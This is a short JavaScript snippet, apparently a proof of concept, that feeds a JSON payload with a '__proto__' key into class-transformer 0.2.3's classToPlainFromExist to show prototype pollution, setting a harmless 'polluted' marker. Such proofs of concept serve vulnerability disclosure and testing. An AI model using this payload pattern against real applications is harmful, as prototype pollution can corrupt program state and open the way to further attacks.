const root = require("./class-transformer@0.2.3");
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

root.classToPlainFromExist(payload, {});
